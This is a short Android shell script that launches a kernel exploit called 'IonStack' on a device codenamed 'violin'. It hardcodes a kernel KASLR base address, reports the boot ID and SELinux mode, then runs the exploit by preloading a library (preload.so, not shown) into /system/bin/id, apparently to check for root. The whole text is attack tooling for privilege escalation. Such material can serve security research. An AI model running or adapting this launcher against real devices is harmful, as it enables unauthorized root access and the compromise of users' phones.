#!/system/bin/sh
# IonStack violin launcher
# Usage: sh /data/local/tmp/run_ionstack.sh

KASLR_BASE="0xffffffdad5200000"

echo "=== IonStack violin-v-oss ==="
echo "KASLR base: $KASLR_BASE"
echo "Boot ID: $(cat /proc/sys/kernel/random/boot_id)"
echo "SELinux: $(getenforce)"
echo "=========================="

# Run the exploit via LD_PRELOAD
CFI_KASLR_BASE="$KASLR_BASE" \
LD_PRELOAD=/data/local/tmp/preload.so \
/system/bin/id
